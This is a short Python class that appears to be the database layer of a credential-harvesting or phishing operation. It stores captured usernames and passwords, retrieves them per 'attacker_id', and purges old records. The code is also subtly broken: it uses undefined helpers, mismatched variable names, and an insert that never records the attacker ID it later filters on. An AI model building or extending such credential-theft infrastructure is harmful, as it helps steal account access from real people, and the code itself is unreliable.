class Database:
    def __init__(self):
        #Establish database connection
        self.connection = cntToDatabase()

    def store_captured_data(self, username, password):
        #Encrypt password
        encr_pass = encrypt(password)
        timestamp = get_current_timestamp()
        query = "insert into captured_data (username, enc_pass, timestamp) VALUES (?, ?, ?)"
        exe_query(self.connection, query, (username, enc_pass, timestamp))

    def retrieve_data_for_attacker(self, attacker_id):
        query = "select username, enc_pass from captured_data WHERE attacker_id = ?"
        return exe_query(self.connection, query, (attacker_id,))

    def implement_data_retention_policies(self):
        return_period = get_reten_period()
        query = "delete from captured_data where timestamp < (CURRENT_TIMESTAMP - ?)"
        exe_query(self.connection, query, (reten_period,))
n